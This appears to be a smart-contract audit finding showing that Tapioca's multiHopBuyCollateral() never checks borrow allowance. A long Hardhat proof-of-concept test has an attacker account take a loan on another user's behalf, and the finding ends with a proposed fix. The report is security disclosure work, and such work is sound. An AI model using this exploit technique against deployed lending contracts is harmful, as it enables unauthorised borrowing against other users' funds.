[H-54] Anybody can buy collateral on behalf of other users without having any allowance using the multiHopBuyCollateral()
Submitted by0xStalin, also found bypeakbolt,plainshift,KIntern_NA,Ack, andrvierdiiev
Malicious actors can buy collateral on behalf of other users without having any allowance to do so.No unauthorized entity should be allowed to take borrows on behalf of other users.
Proof of Concept
TheSGLLeverage::multiHopBuyCollateral()function allows users to level up cross-chain: Borrow more and buy collateral with it, the function receives as parameters the account that the borrow will be credited to, the amount of collateral to add (if any), the amount that is being borrowed and a couple of other variables.TheSGLLeverage::multiHopBuyCollateral()function only calls thesolvent()modifier, which will validate that the account is solvent at the end of the operation.ThecollateralAmountvariable is used to compute the required number of shares to add the specifiedcollateralAmountas extra collateral to the borrower account, then there is a check to validate that the caller has enough allowance to add those shares of collateral, and if so, then the collateral is added and debited to thefromaccount
...//add collateraluint256collateralShare=yieldBox.toShare(collateralId,collateralAmount,false);_allowedBorrow(from,collateralShare);_addCollateral(from,from,false,0,collateralShare);...
After adding the extra collateral (if any), theexecution proceeds to call the_borrow()to ask for a borrow specified by theborrowAmountparameter, and finally calls the USDO::sendForLeverage().The problem is that the function only validates if the caller has enough allowance for thecollateralAmountto be added, but it doesn’t check if the caller has enough allowance for the equivalent of shares of theborrowAmount(which is the total amount that will be borrowed!).The exploit occurs whena malicious actor calls themultiHopBuyCollateral()sending the values of the parameters as follows:from=> The account that will buy collateral and the borrow will be credited tocollateralAmount=>Set as 0borrowAmount=>The maximum amount that thefromaccount can borrow without falling into insolvency because of the borrowingWhat will happen is that a malicious actor without any allowance will be able to skip the check that validates if it has enough allowance to add more collateral, and will be able to take the borrow on behalf of thefromaccount, because theborrowShare(which represents the equivalent shares to take a borrow ofborrowAmount) is not used to validate if the caller has enough allowance to take that amount of debt on behalf of thefromaccount
Coded a Poc
I used thetapioca-bar-audit/test/singularity.test.tsas the base for this PoC.If you’d like to use the originaltapioca-bar-audit/test/singularity.test.tsfile, just make sure to update these two lines as follow:
diff--gita/singularity.test.tsb/singularity.test.ts.modifiedindex9c82d10..9ba9c76100755---a/singularity.test.ts+++b/singularity.test.ts.modified@@ -3440,6+3440,7@@describe('Singularity test', ()=>{it('should bounce between 2 chains',async()=>{const{deployer,+eoa1,tap,weth,createTokenEmptyStrategy,@@ -4082,7 +4083,7 @@describe('Singularitytest', () => {ethers.constants.MaxUint256,);-            await SGL_10.multiHopBuyCollateral(+            await SGL_10.connect(eoa1).multiHopBuyCollateral(deployer.address,0,bigDummyAmount,
I highly recommend to create a new test file with the below code snippet for the purpose of validating this vulnerability,make sure to create this file in the same folder as thetapioca-bar-audit/test/singularity.test.tsfile.
importhre, {ethers}from'hardhat';import{BigNumberish,BytesLike,Wallet}from'ethers';import{expect}from'chai';import{BN,getSGLPermitSignature,register}from'./test.utils';import{loadFixture,takeSnapshot,}from'@nomicfoundation/hardhat-network-helpers';import{LiquidationQueue__factory}from'../gitsub_tapioca-sdk/src/typechain/tapioca-periphery';import{ERC20Mock,ERC20Mock__factory,LZEndpointMock__factory,OracleMock__factory,UniswapV3SwapperMock__factory,}from'../gitsub_tapioca-sdk/src/typechain/tapioca-mocks';import{SignerWithAddress}from'@nomiclabs/hardhat-ethers/signers';import{BaseTOFT,BaseTOFTLeverageModule__factory,BaseTOFTMarketModule__factory,BaseTOFTOptionsModule__factory,BaseTOFTStrategyModule__factory,TapiocaOFT,TapiocaOFT__factory,TapiocaWrapper__factory,}from'../gitsub_tapioca-sdk/src/typechain/tapiocaz';importTapiocaOFTArtifactfrom'../gitsub_tapioca-sdk/src/artifacts/tapiocaz/TapiocaOFT.json';describe('Singularity test', ()=>{describe('multiHopBuyCollateral()',async()=>{constdeployYieldBox=async(signer:SignerWithAddress)=>{consturiBuilder=await(awaitethers.getContractFactory('YieldBoxURIBuilder')).deploy();constyieldBox=await(awaitethers.getContractFactory('YieldBox')).deploy(ethers.constants.AddressZero,uriBuilder.address);return{uriBuilder,yieldBox};};constdeployLZEndpointMock=async(chainId:number,signer:SignerWithAddress,)=>{constLZEndpointMock=newLZEndpointMock__factory(signer);returnawaitLZEndpointMock.deploy(chainId);};constdeployTapiocaWrapper=async(signer:SignerWithAddress)=>{constTapiocaWrapper=newTapiocaWrapper__factory(signer);returnawaitTapiocaWrapper.deploy(signer.address);};constTx_deployTapiocaOFT=async(lzEndpoint:string,isNative:boolean,erc20Address:string,yieldBoxAddress:string,hostChainID:number,hostChainNetworkSigner:SignerWithAddress,)=>{consterc20= (awaitethers.getContractAt('IERC20Metadata',erc20Address)).connect(hostChainNetworkSigner);consterc20name=awaiterc20.name();consterc20symbol=awaiterc20.symbol();consterc20decimal=awaiterc20.decimals();// eslint-disable-next-line @typescript-eslint/ban-ts-comment// @ts-ignoreconstBaseTOFTLeverageModule=newBaseTOFTLeverageModule__factory(hostChainNetworkSigner,);constleverageModule=awaitBaseTOFTLeverageModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constBaseTOFTStrategyModule=newBaseTOFTStrategyModule__factory(hostChainNetworkSigner,);conststrategyModule=awaitBaseTOFTStrategyModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constBaseTOFTMarketModule=newBaseTOFTMarketModule__factory(hostChainNetworkSigner,);constmarketModule=awaitBaseTOFTMarketModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constBaseTOFTOptionsModule=newBaseTOFTOptionsModule__factory(hostChainNetworkSigner,);constoptionsModule=awaitBaseTOFTOptionsModule.deploy(lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,);constargs:Parameters<TapiocaOFT__factory['deploy']> = [lzEndpoint,erc20Address,yieldBoxAddress,erc20name,erc20symbol,erc20decimal,hostChainID,leverageModule.address,strategyModule.address,marketModule.address,optionsModule.address,];constTapiocaOFT=newTapiocaOFT__factory(hostChainNetworkSigner);consttxData=TapiocaOFT.getDeployTransaction(...args).dataasBytesLike;return{txData,args};};constattachTapiocaOFT=async(address:string,signer:SignerWithAddress,)=>{consttapiocaOFT=newethers.Contract(address,TapiocaOFTArtifact.abi,signer,);returntapiocaOFT.connect(signer);};constmintAndApprove=async(erc20Mock:ERC20Mock,toft:BaseTOFT,signer:SignerWithAddress,amount:BigNumberish,)=>{awaiterc20Mock.freeMint(amount);awaiterc20Mock.approve(toft.address,amount);};it('Attacker will take a borrow on behalf of another user without having any allowance',async()=>{const{deployer,eoa1,tap,weth,createTokenEmptyStrategy,deployCurveStableToUsdoBidder,magnetar,createWethUsd0Singularity,registerBigBangMarket,wethUsdcOracle,} =awaitloadFixture(register);//Deploy LZEndpointMockconstLZEndpointMock_chainID_0=awaitdeployLZEndpointMock(0,deployer,);constLZEndpointMock_chainID_10=awaitdeployLZEndpointMock(10,deployer,);//Deploy TapiocaWrapperconsttapiocaWrapper_0=awaitdeployTapiocaWrapper(deployer);consttapiocaWrapper_10=awaitdeployTapiocaWrapper(deployer);//Deploy YB and StrategiesconstyieldBox0Data=awaitdeployYieldBox(deployer);constYieldBox_0=yieldBox0Data.yieldBox;constusdo_0_leverage=await(awaitethers.getContractFactory('USDOLeverageModule')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address);constusdo_0_market=await(awaitethers.getContractFactory('USDOMarketModule')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address);constusdo_0_options=await(awaitethers.getContractFactory('USDOOptionsModule')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address);constUSDO_0=await(awaitethers.getContractFactory('USDO')).deploy(LZEndpointMock_chainID_0.address,YieldBox_0.address,deployer.address,usdo_0_leverage.address,usdo_0_market.address,usdo_0_options.address,);awaitUSDO_0.deployed();constusdo_10_leverage=await(awaitethers.getContractFactory('USDOLeverageModule')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address);constusdo_10_market=await(awaitethers.getContractFactory('USDOMarketModule')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address);constusdo_10_options=await(awaitethers.getContractFactory('USDOOptionsModule')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address);constUSDO_10=await(awaitethers.getContractFactory('USDO')).deploy(LZEndpointMock_chainID_10.address,YieldBox_0.address,deployer.address,usdo_10_leverage.address,usdo_10_market.address,usdo_10_options.address,);awaitUSDO_10.deployed();//Deploy PenroseconstBAR_0=await(awaitethers.getContractFactory('Penrose')).deploy(YieldBox_0.address,tap.address,weth.address,deployer.address,);awaitBAR_0.deployed();awaitBAR_0.setUsdoToken(USDO_0.address);//Deploy ERC20MockconstERC20Mock=newERC20Mock__factory(deployer);consterc20Mock=awaitERC20Mock.deploy('erc20Mock','MOCK',0,18,deployer.address,);awaiterc20Mock.toggleRestrictions();// master contractconstmediumRiskMC_0=await(awaitethers.getContractFactory('Singularity')).deploy();awaitmediumRiskMC_0.deployed();awaitBAR_0.registerSingularityMasterContract(mediumRiskMC_0.address,1,);constmediumRiskMCBigBang_0=await(awaitethers.getContractFactory('BigBang')).deploy();awaitmediumRiskMCBigBang_0.deployed();awaitBAR_0.registerBigBangMasterContract(mediumRiskMCBigBang_0.address,1,);//Deploy TapiocaOFT{consttxData=awaittapiocaWrapper_0.populateTransaction.createTOFT(erc20Mock.address,(awaitTx_deployTapiocaOFT(LZEndpointMock_chainID_0.address,false,erc20Mock.address,YieldBox_0.address,31337,deployer,)).txData,ethers.utils.randomBytes(32),false,);txData.gasLimit=awaithre.ethers.provider.estimateGas(txData);awaitdeployer.sendTransaction(txData);}consttapiocaOFT0= (awaitattachTapiocaOFT(awaittapiocaWrapper_0.tapiocaOFTs((awaittapiocaWrapper_0.tapiocaOFTLength()).sub(1),),deployer,))asTapiocaOFT;{consttxData=awaittapiocaWrapper_10.populateTransaction.createTOFT(erc20Mock.address,(awaitTx_deployTapiocaOFT(LZEndpointMock_chainID_10.address,false,erc20Mock.address,YieldBox_0.address,31337,deployer,)).txData,ethers.utils.randomBytes(32),false,);txData.gasLimit=awaithre.ethers.provider.estimateGas(txData);awaitdeployer.sendTransaction(txData);}consttapiocaOFT10= (awaitattachTapiocaOFT(awaittapiocaWrapper_10.tapiocaOFTs((awaittapiocaWrapper_10.tapiocaOFTLength()).sub(1),),deployer,))asTapiocaOFT;//Deploy strategiesconstStrategy_0=awaitcreateTokenEmptyStrategy(YieldBox_0.address,tapiocaOFT0.address,);constStrategy_10=awaitcreateTokenEmptyStrategy(YieldBox_0.address,tapiocaOFT10.address,);// Set trusted remotesconstdstChainId0=awaitLZEndpointMock_chainID_0.getChainId();constdstChainId10=awaitLZEndpointMock_chainID_10.getChainId();awaitUSDO_0.setTrustedRemote(dstChainId10,ethers.utils.solidityPack(['address','address'],[USDO_10.address,USDO_0.address],),);awaitUSDO_0.setTrustedRemote(31337,ethers.utils.solidityPack(['address','address'],[USDO_10.address,USDO_0.address],),);awaitUSDO_10.setTrustedRemote(dstChainId0,ethers.utils.solidityPack(['address','address'],[USDO_0.address,USDO_10.address],),);awaitUSDO_10.setTrustedRemote(31337,ethers.utils.solidityPack(['address','address'],[USDO_0.address,USDO_10.address],),);awaittapiocaWrapper_0.executeTOFT(tapiocaOFT0.address,tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [dstChainId10,ethers.utils.solidityPack(['address','address'],[tapiocaOFT10.address,tapiocaOFT0.address],),]),true,);awaittapiocaWrapper_0.executeTOFT(tapiocaOFT0.address,tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [31337,ethers.utils.solidityPack(['address','address'],[tapiocaOFT10.address,tapiocaOFT0.address],),]),true,);awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [dstChainId0,ethers.utils.solidityPack(['address','address'],[tapiocaOFT0.address,tapiocaOFT10.address],),]),true,);awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [dstChainId10,ethers.utils.solidityPack(['address','address'],[tapiocaOFT0.address,tapiocaOFT10.address],),]),true,);awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [31337,ethers.utils.solidityPack(['address','address'],[tapiocaOFT0.address,tapiocaOFT10.address],),]),true,);// Link endpoints with addressesawaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(USDO_10.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_0.setDestLzEndpoint(USDO_0.address,LZEndpointMock_chainID_10.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(USDO_0.address,LZEndpointMock_chainID_0.address,);awaitLZEndpointMock_chainID_10.setDestLzEndpoint(USDO_10.address,LZEndpointMock_chainID_0.address,);//Register tokens on YBawaitYieldBox_0.registerAsset(1,tapiocaOFT0.address,Strategy_0.address,0,);awaitYieldBox_0.registerAsset(1,tapiocaOFT10.address,Strategy_10.address,0,);consttapiocaOFT0Id=awaitYieldBox_0.ids(1,tapiocaOFT0.address,Strategy_0.address,0,);consttapiocaOFT10Id=awaitYieldBox_0.ids(1,tapiocaOFT10.address,Strategy_10.address,0,);expect(tapiocaOFT0Id.gt(0)).to.be.true;expect(tapiocaOFT10Id.gt(0)).to.be.true;expect(tapiocaOFT10Id.gt(tapiocaOFT0Id)).to.be.true;constbigDummyAmount=ethers.utils.parseEther('10');awaitmintAndApprove(erc20Mock,tapiocaOFT0,deployer,bigDummyAmount,);awaittapiocaOFT0.wrap(deployer.address,deployer.address,bigDummyAmount,);awaittapiocaOFT0.approve(YieldBox_0.address,ethers.constants.MaxUint256,);consttoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false,);awaitYieldBox_0.depositAsset(tapiocaOFT0Id,deployer.address,deployer.address,0,toDepositShare,);letyb0Balance=awaitYieldBox_0.amountOf(deployer.address,tapiocaOFT0Id,);expect(yb0Balance.eq(bigDummyAmount)).to.be.true;//bc of the yieldconst{stableToUsdoBidder,curveSwapper} =awaitdeployCurveStableToUsdoBidder(YieldBox_0,tapiocaOFT0,USDO_0,false,);letsglMarketData=awaitcreateWethUsd0Singularity(USDO_0,tapiocaOFT0,BAR_0,awaitBAR_0.usdoAssetId(),tapiocaOFT0Id,mediumRiskMC_0,YieldBox_0,stableToUsdoBidder,0,);constSGL_0=sglMarketData.wethUsdoSingularity;sglMarketData=awaitcreateWethUsd0Singularity(USDO_0,tapiocaOFT10,BAR_0,awaitBAR_0.usdoAssetId(),tapiocaOFT10Id,mediumRiskMC_0,YieldBox_0,stableToUsdoBidder,0,);constSGL_10=sglMarketData.wethUsdoSingularity;awaittapiocaOFT0.approve(SGL_0.address,ethers.constants.MaxUint256,);awaitYieldBox_0.setApprovalForAll(SGL_0.address,true);awaitSGL_0.addCollateral(deployer.address,deployer.address,false,bigDummyAmount,0,);constcollateralShare=awaitSGL_0.userCollateralShare(deployer.address,);expect(collateralShare.gt(0)).to.be.true;constcollateralAmount=awaitYieldBox_0.toAmount(tapiocaOFT0Id,collateralShare,false,);expect(collateralAmount.eq(bigDummyAmount)).to.be.true;//test wrapawaitmintAndApprove(erc20Mock,tapiocaOFT10,deployer,bigDummyAmount,);awaittapiocaOFT10.wrap(deployer.address,deployer.address,bigDummyAmount,);consttapioca10Balance=awaittapiocaOFT10.balanceOf(deployer.address,);expect(tapioca10Balance.eq(bigDummyAmount)).to.be.true;awaittapiocaOFT10.approve(YieldBox_0.address,ethers.constants.MaxUint256,);awaitYieldBox_0.depositAsset(tapiocaOFT10Id,deployer.address,deployer.address,0,toDepositShare,);yb0Balance=awaitYieldBox_0.amountOf(deployer.address,tapiocaOFT10Id,);expect(yb0Balance.eq(bigDummyAmount)).to.be.true;//bc of the yieldawaittapiocaOFT10.approve(SGL_10.address,ethers.constants.MaxUint256,);awaitYieldBox_0.setApprovalForAll(SGL_10.address,true);awaitSGL_10.addCollateral(deployer.address,deployer.address,false,bigDummyAmount,0,);constsgl10CollateralShare=awaitSGL_10.userCollateralShare(deployer.address,);expect(sgl10CollateralShare.eq(collateralShare)).to.be.true;constUniswapV3SwapperMock=newUniswapV3SwapperMock__factory(deployer,);constuniV3SwapperMock=awaitUniswapV3SwapperMock.deploy(ethers.constants.AddressZero,);//lend some USD0 to SGL_10constoraclePrice=BN(1).mul((1e18).toString());constOracleMock=newOracleMock__factory(deployer);constoracleMock=awaitOracleMock.deploy('WETHMOracle','WETHMOracle',(1e18).toString(),);awaitwethUsdcOracle.deployed();awaitwethUsdcOracle.set(oraclePrice);const{bigBangMarket} =awaitregisterBigBangMarket(mediumRiskMCBigBang_0.address,YieldBox_0,BAR_0,weth,awaitBAR_0.wethAssetId(),oracleMock,0,0,0,0,0,);awaitweth.freeMint(bigDummyAmount.mul(5));awaitweth.approve(bigBangMarket.address,ethers.constants.MaxUint256,);awaitweth.approve(YieldBox_0.address,ethers.constants.MaxUint256);awaitYieldBox_0.setApprovalForAll(bigBangMarket.address,true);awaitYieldBox_0.depositAsset(awaitBAR_0.wethAssetId(),deployer.address,deployer.address,bigDummyAmount.mul(5),0,);awaitbigBangMarket.addCollateral(deployer.address,deployer.address,false,bigDummyAmount.mul(5),0,);constbigBangCollateralShare=awaitbigBangMarket.userCollateralShare(deployer.address);expect(bigBangCollateralShare.gt(0)).to.be.true;constcollateralIdSaved=awaitbigBangMarket.collateralId();constwethId=awaitBAR_0.wethAssetId();expect(collateralIdSaved.eq(wethId)).to.be.true;awaitUSDO_0.setMinterStatus(bigBangMarket.address,true);awaitbigBangMarket.borrow(deployer.address,deployer.address,bigDummyAmount.mul(3),);constusdoBorrowPart=awaitbigBangMarket.userBorrowPart(deployer.address,);expect(usdoBorrowPart.gt(0)).to.be.true;awaitYieldBox_0.withdraw(awaitbigBangMarket.assetId(),deployer.address,deployer.address,bigDummyAmount.mul(3),0,);constusdoBalance=awaitUSDO_0.balanceOf(deployer.address);expect(usdoBalance.gt(0)).to.be.true;constusdoBalanceShare=awaitYieldBox_0.toShare(awaitbigBangMarket.assetId(),usdoBalance.div(2),false,);awaitUSDO_0.approve(YieldBox_0.address,ethers.constants.MaxUint256,);awaitYieldBox_0.depositAsset(awaitbigBangMarket.assetId(),deployer.address,deployer.address,usdoBalance.div(2),0,);awaitSGL_10.addAsset(deployer.address,deployer.address,false,usdoBalanceShare,);consttotalSGL10Asset=awaitSGL_10.totalAsset();expect(totalSGL10Asset[0].gt(0)).to.be.true;letairdropAdapterParamsDst=hre.ethers.utils.solidityPack(['uint16','uint','uint','address'],[2,1_000_000,//extra gas limit; min 200kethers.utils.parseEther('2'),//amount of eth to airdropUSDO_10.address,],);constairdropAdapterParamsSrc=hre.ethers.utils.solidityPack(['uint16','uint','uint','address'],[2,1_000_000,//extra gas limit; min 200kethers.utils.parseEther('1'),//amount of eth to airdropmagnetar.address,],);constsgl10Asset=awaitSGL_10.asset();expect(sgl10Asset).to.eq(USDO_0.address);constuserCollateralShareBefore=awaitSGL_0.userCollateralShare(deployer.address,);expect(userCollateralShareBefore.eq(bigDummyAmount.mul(1e8))).to.be.true;constborrowPartBefore=awaitSGL_10.userBorrowPart(deployer.address,);expect(borrowPartBefore.eq(0)).to.be.true;awaitBAR_0.setSwapper(uniV3SwapperMock.address,true);awaitSGL_0.approve(tapiocaOFT0.address,ethers.constants.MaxUint256,);awaitSGL_0.approveBorrow(tapiocaOFT0.address,ethers.constants.MaxUint256,);awaitSGL_10.connect(eoa1).multiHopBuyCollateral(deployer.address,0,bigDummyAmount,{tokenOut:awaittapiocaOFT10.erc20(),amountOutMin:0,data:ethers.utils.toUtf8Bytes(''),},{srcExtraGasLimit:1_000_000,lzSrcChainId:0,lzDstChainId:10,zroPaymentAddress:ethers.constants.AddressZero,dstAirdropAdapterParam:airdropAdapterParamsDst,srcAirdropAdapterParam:airdropAdapterParamsSrc,refundAddress:deployer.address,},{swapper:uniV3SwapperMock.address,magnetar:magnetar.address,tOft:tapiocaOFT10.address,srcMarket:SGL_0.address,//there should be SGL_10 here in a normal situation; however, due to the current setup and how tokens are linked together, it will point to SGL_0},{value:ethers.utils.parseEther('10'),},);constuserCollateralShareAfter=awaitSGL_0.userCollateralShare(deployer.address,);expect(userCollateralShareAfter.gt(userCollateralShareBefore)).to.be.true;constuserCollateralAmount=awaitYieldBox_0.toAmount(tapiocaOFT10Id,userCollateralShareAfter,false,);expect(userCollateralAmount.eq(bigDummyAmount.mul(2))).to.be.true;constborrowPartAfter=awaitSGL_10.userBorrowPart(deployer.address,);expect(borrowPartAfter.gt(bigDummyAmount)).to.be.true;});});});
The PoC will demonstrate how an attacker can take borrows on behalf of other users without having any allowance by exploiting a vulnerability in the multiHopBuyCollateral()

Recommended Mitigation Steps
Make sure to validate that the caller has enough allowance to take the borrow specified by theborrowAmount.Use the returned amountborrowSharefrom the_borrow()to validate if the caller has enough allowance to take that borrow.
functionmultiHopBuyCollateral(addressfrom,uint256collateralAmount,uint256borrowAmount,IUSDOBase.ILeverageSwapDatacalldataswapData,IUSDOBase.ILeverageLZDatacalldatalzData,IUSDOBase.ILeverageExternalContractsDatacalldataexternalData)externalpayablenotPausedsolvent(from) {...//borrow(,uint256borrowShare) =_borrow(from,from,borrowAmount);+//@audit => Validate that the caller has enough allowance to take the borrow+_allowedBorrow(from,borrowShare);...}
0xRektora (Tapioca) confirmed via duplicate issue 121